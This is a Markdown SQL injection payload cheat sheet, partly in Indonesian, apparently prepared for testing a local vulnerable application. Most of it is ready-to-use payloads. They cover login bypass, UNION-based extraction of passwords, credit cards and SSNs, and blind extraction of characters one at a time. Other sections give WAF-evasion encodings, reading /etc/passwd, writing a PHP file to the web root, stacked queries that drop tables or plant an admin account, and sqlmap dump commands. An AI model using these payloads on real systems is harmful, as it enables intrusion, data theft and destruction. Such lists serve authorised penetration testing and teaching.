# SQL Injection Payloads untuk Testing

## Authentication Bypass Payloads (✅ TESTED)

### Basic OR Injection (WORKING)
```
admin' OR '1'='1' -- 
admin' OR 1=1 -- 
' OR 1=1 -- 
" OR 1=1 -- 
admin' OR 'a'='a' -- 
' OR 'x'='x' -- 
```

**Important:** Space after `--` is required in MySQL!

### Comment-based Bypass
```
admin'/*
admin'#
admin'--
```

### Boolean-based Bypass
```
admin') OR ('1'='1
admin') OR ('a'='a') --
```

## Union-based Injection (✅ TESTED)

### Column Discovery (WORKING - 6 columns detected)
```
' UNION SELECT 1 -- 
' UNION SELECT 1,2 -- 
' UNION SELECT 1,2,3 -- 
' UNION SELECT 1,2,3,4 -- 
' UNION SELECT 1,2,3,4,5 -- 
' UNION SELECT 1,2,3,4,5,6 -- 
```

### Information Gathering (✅ VERIFIED)
```
' UNION SELECT 1,database(),user(),version(),5,6 -- 
' UNION SELECT 1,@@hostname,@@datadir,@@version,5,6 -- 
' UNION SELECT 1,schema_name,3,4,5,6 FROM information_schema.schemata -- 
```

### Data Extraction (⚠️ DANGEROUS - TESTED)
```
' UNION SELECT 1,secret_info,credit_card,ssn,5,6 FROM sensitive_data -- 
' UNION SELECT 1,username,password,email,5,6 FROM users -- 
' UNION SELECT 1,CONCAT(username,':',password),email,role,5,6 FROM users -- 
```

## Error-based Injection

### MySQL Error-based
```
' AND extractvalue(1,concat(0x5c,database())) --
' AND updatexml(1,concat(0x5c,database()),1) --
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

## Time-based Blind Injection

### MySQL Time-based
```
' AND SLEEP(5) --
' AND (SELECT SLEEP(5)) --
' AND IF(1=1,SLEEP(5),0) --
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0) --
```

### Conditional Time-based
```
' AND IF((SELECT SUBSTR(database(),1,1))='v',SLEEP(5),0) --
' AND IF((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0) --
```

## Boolean-based Blind Injection

### Basic Boolean Tests
```
' AND 1=1 --
' AND 1=2 --
' AND (SELECT COUNT(*) FROM users)>0 --
' AND (SELECT COUNT(*) FROM users)>10 --
```

### Character-by-character Extraction
```
' AND (SELECT SUBSTR(database(),1,1))='v' --
' AND (SELECT SUBSTR(database(),2,1))='u' --
' AND (SELECT LENGTH(database()))=13 --
```

### Password Extraction
```
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5 --
```

## Advanced Payloads

### WAF Bypass
```
admin'/**/OR/**/1=1/**/--
admin'/**/UNION/**/SELECT/**/1,2,3,4/**/--
admin' OR 'x'='x
admin' %41%4E%44 1=1 --
admin' /*!OR*/ 1=1 --
```

### Alternative Operators
```
admin' || 1=1 --
admin' && 1=1 --
admin' | 1 --
admin' & 1 --
```

### Case Variations
```
admin' oR 1=1 --
admin' Or 1=1 --
admin' OR 1=1 --
admin' UnIoN sElEcT 1,2,3,4 --
```

### Encoding Variations
```
admin%27%20OR%201=1%20--
admin' OR 1=1 %23
admin' OR 1=1 %2D%2D
```

## Second-order Injection Payloads

### Registration Payloads
```
username: admin'--
username: admin' OR 1=1--
username: '; DROP TABLE users; --
```

## File System Access (MySQL)

### File Reading
```
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4 --
' UNION SELECT 1,LOAD_FILE('c:\\windows\\system32\\drivers\\etc\\hosts'),3,4 --
```

### File Writing
```
' UNION SELECT 1,'<?php phpinfo(); ?>',3,4 INTO OUTFILE '/var/www/html/info.php' --
```

## Stacked Queries (jika didukung)

### Multiple Statements
```
admin'; INSERT INTO users VALUES (999,'hacker','hacked','hacker@evil.com','admin'); --
admin'; UPDATE users SET password='hacked' WHERE username='admin'; --
admin'; DROP TABLE sensitive_data; --
```

## Tips untuk Testing

1. **Start Simple**: Mulai dengan payload sederhana seperti `' OR 1=1 --`
2. **Test All Fields**: Coba semua input field, tidak hanya username/password
3. **Check Responses**: Perhatikan perbedaan response untuk menentukan vulnerability
4. **Use Tools**: Gunakan tools seperti SQLmap untuk automated testing
5. **Document Findings**: Catat semua payload yang berhasil untuk reporting

## SQLmap Examples

### Basic Detection
```bash
sqlmap -u "http://localhost:8080" --data="username=admin&password=admin"
```

### Database Enumeration
```bash
sqlmap -u "http://localhost:8080" --data="username=admin&password=admin" --dbs
```

### Table Enumeration
```bash
sqlmap -u "http://localhost:8080" --data="username=admin&password=admin" -D vulnerable_app --tables
```

### Data Extraction
```bash
sqlmap -u "http://localhost:8080" --data="username=admin&password=admin" -D vulnerable_app -T users --dump
```

---

**⚠️ Reminder**: Gunakan payloads ini hanya untuk testing pada environment yang Anda miliki atau memiliki izin explicit untuk testing!
